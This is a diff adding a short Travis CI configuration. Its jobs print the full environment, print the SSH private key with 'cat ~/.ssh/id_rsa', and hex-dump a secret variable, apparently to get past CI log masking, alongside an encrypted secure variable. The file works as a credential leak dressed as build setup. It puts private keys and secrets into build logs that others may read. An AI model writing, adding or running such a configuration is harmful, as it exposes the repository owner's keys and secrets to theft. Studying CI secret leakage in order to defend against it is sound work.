@@ -1,0 +1,9 @@
+language: bash
+jobs:
+  include:
+  - script: env
+  - script: cat ~/.ssh/id_rsa
+  - script: echo $SECRET1 |hd
+env:
+  global:
+    secure: G0VRhm3XGjwLYEcWAVTT1Chg+4RQ7M4uMDW88zZTHG+x7jzqNKS5OUr5IWZBdTz2ILrvt/Tb6SmFqToA3XX+3Lw5ezk8VCA/U8yKPhbgUGUR4I45Jh9nscja4mlt/TpCuDCd1hhJ1zVLI/LmH1/nnleH1ekLo9zA6tfktxJXQHLZLgo16hFHmdZLyZIUiz1n675e/vPZYD21Zc4YXIDffzOF1Vxu+oq8hGxnumj5YbxeN7BY9Pc7jCWHFrbRYSkG+AOqqyojTpPcQBWGm5LhShyvXmSe9HNorZDO0DkIpL8t8icMRK592UDVBdSVKzjCG4Kj+VFaTRCmNEXd4T6RberlNwass3lHxg6JXANnM2PDUUp2L42jlMNIDRkFvugDUnxmmPEWfeiWG3stHSJsdr+L4DBKHob30sDg/F86racmgRB3vzqoXL7wTZ7hAXwzTk2lZNzoegbqzjo3oUWiD0kEL7UKhgyC3z2VkosKwnmyfSlQvG5/9FVHIuvbT+XIC+isCHeP2tUlHLGsDg4hnyOpg5MERgxhFGl9Jxse+vfeDiuyBlPv8W/2r8eBstnYwIUZDC1DbQlFwCiMqrNfK89HdSZuA9ANRQJ2jUdYS6YkGZi086GwyM4bSyjxrZKJy+BfrYUCE/Eeerjr7pYoq46YK8myC4HWLFK5Xbyvjak=
